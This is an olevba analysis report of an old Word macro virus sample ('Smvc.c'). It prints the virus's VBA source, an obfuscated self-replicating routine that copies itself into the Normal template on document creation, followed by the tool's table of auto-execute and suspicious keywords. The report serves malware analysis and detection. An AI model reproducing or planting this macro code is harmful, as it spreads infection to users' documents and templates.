olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Smvc.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Smvc.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul1.bas 
in file: Virus.MSWord.Smvc.c - OLE stream: 'Macros/VBA/Modul1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*
'$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$
'*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*
'   __   __
'  |  | |  |
' _|__|_|__|_   ____      ____   _________   _________   _________   ____   ____   ___   ________
'/           \ /    \    /    \ /         \ /         \ /         \ /    \ /    \ /   \ /        \
'|   ________| |     \  /     | |   ___   | |   ___   | |         | |    | |    | |   | |   _____/
'|  |          |      \/      | |  /   \  | |  /   \  | |         | |    | |    | \___/ |   |
'|  |________  |              | |  |   |  | |  |   |  | |__     __| |    |_|    |  ___  |   |__
'|           \ |              | |  |   |  | |  |   |  |    |   |    |           | |   | |      |
'|______     | |    |\  /|    | |  |   |  | |  |   |  |    |   |    |     _     | |   | |    __|
'       |    | |    | \/ |    | |  |   |  | |  |   |  |    |   |    |    | |    | |   | |   |
' ______|    | |    |    |    | |  \___/  | |  \___/  |    |   |    |    | |    | |   | |   |____
'|           | |    |    |    | |         | |         |    |   |    |    | |    | |   | |        \
'\___________/ \____/    \____/ \_________/ \_________/    \___/    \____/ \____/ \___/ \________/
'  |  | |  |                                                - $MOOTHiE Da HuStla [ZeroGravity]
'  |__| |__|                                                - August 15, 2000
'
'*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*
'$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$
'*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*

'Virus Creation: 09/09/00 13.39.58
'$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$
'$*  Poly       = No            $*
'$*  Retro      = No            $*
'$*  Infection  = New           $*
'$*  Payload    = No            $*
'$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$

|-----====== CODE Starts ======-----|

Private Sub Document_New()
On Error Resume Next
'Author:   1
'Name:     1
'Comments: 1
'Origin:   1
'This Word2000 virus was created using $MOOTHiE Da HuStla's Macro Virus Creator 2000 Ver 2.0

On Error Resume Next: Randomize: Dim DocCode As Object, NormCode As Object
Set AAA1 = Activedocument: Set AAA2 = AAA1.VBProject: Set AAA3 = AAA2.VBComponents
Set AAA4 = AAA3.Item(1): Set DocCode = AAA4.CodeModule
Set BBB1 = NormalTemplate: Set BBB2 = BBB1.VBProject: Set BBB3 = BBB2.VBComponents
Set BBB4 = BBB3.Item(1): Set NormCode = BBB4.CodeModule

XXXA = (23250758647918.7 - 23250758647918.7 + 46450978517.0678 + 46450978517.0678 - (46450978516.5678 * 2))
XXXB = (23250758647918.7 - 23250758647915.7 + 46450978517.0678 + 46450978517.0678 - (46450978517.0678 * 2))
AAA = NormCode.lines(XXXB, XXXA)
BBB = DocCode.lines(XXXB, XXXA)
CCC = ""

If AAA = CCC Then GoTo XXXC
If BBB = CCC Then GoTo XXXD

XXXC:
Do Until XXXE = DocCode.countoflines
XXXE = XXXE + XXXA

AAA = AAA + DocCode.lines(XXXE, XXXA) & vbCr
Loop
NormCode.insertlines XXXA, AAA
GoTo XXXF

XXXD:
Do Until XXXE = NormCode.countoflines
XXXE = XXXE + XXXA

AAA = AAA + NormCode.lines(XXXE, XXXA) & vbCr
Loop
DocCode.insertlines XXXA, CCC

XXXF:
Activedocument.Save: NormalTemplate.Save
End Sub

Private Sub Document_Close()
On Error Resume Next
End Sub


|-----====== CODE Ends ======-----|

*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*
$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$
*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Hex String|FE      xQ          |4645097851                                   |
+----------+--------------------+---------------------------------------------+

